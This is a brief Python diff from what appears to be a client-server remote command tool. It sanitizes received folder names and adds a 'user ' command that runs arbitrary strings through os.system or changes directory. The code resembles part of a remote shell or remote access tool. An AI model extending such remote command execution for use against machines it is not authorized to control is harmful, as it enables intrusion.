@@ -101,7 +101,7 @@ def download2(client):
         print(recv(client))
 
     elif filetype == "dir\n":
-        folder_name = recv(client)[:-1]
+        folder_name = recv(client)[:-1].split("/")[-1]
         try:
             os.mkdir(folder_name)
         except:
@@ -140,7 +140,12 @@ def commands(cmd, output, client):
     if cmd.startswith("download "):
             download2(client)
             output = (recv(client))
-
+    if cmd.startswith("user "):
+        cmd = cmd.replace("user ", "")
+        if (cmd.startswith("cd ")):
+            os.chdir(cmd.replace("cd ",""))
+        else:
+            os.system(cmd)
            
     return output
 
